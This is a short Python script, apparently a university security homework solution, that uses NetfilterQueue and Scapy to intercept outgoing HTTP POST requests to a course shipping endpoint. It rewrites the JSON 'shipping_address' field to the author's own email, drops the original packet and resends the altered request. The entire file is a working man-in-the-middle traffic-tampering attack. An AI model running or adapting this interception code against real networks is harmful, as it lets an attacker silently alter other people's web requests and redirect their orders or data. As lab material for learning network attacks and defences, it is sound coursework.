from netfilterqueue import NetfilterQueue
from scapy.all import *
import json
import requests

def callback(pkt):
    ip = IP(pkt.get_payload())
    if ip[TCP].dport == 80:
        if ip.haslayer(Raw):
            http = ip[Raw].load.decode()
            fields = http.split("\r\n")
            if "POST /hw1/ex3/shipping" in fields[0]:
                data = fields[-1]
                json_data = json.loads(data)
                if "shipping_address" in json_data:
                    print("Packet with shipping address found\n")
                    print(json_data)

                    # Changing shipping address
                    json_data["shipping_address"] = "andrea.piccione@epfl.ch"

                    # Checking modification
                    print(json_data)

                    # Dropping packet
                    pkt.drop()

                    # Sending new paket
                    r = requests.post("http://com402.epfl.ch/hw1/ex3/shipping", json=json_data)
                    print(r.status_code, r.reason)
                    print(r.text)
                    print()
                    print("Address changed, you can now stop the traffic with CTRL + C")

                else:
                    pkt.accept()

    else:
        pkt.accept()


# Starting looking at the traffic
nfqueue = NetfilterQueue()
nfqueue.bind(0, callback, 100)
print("Looking for packets to the shipping...\n")

try:
    nfqueue.run()
except KeyboardInterrupt:
    print('')

nfqueue.unbind()
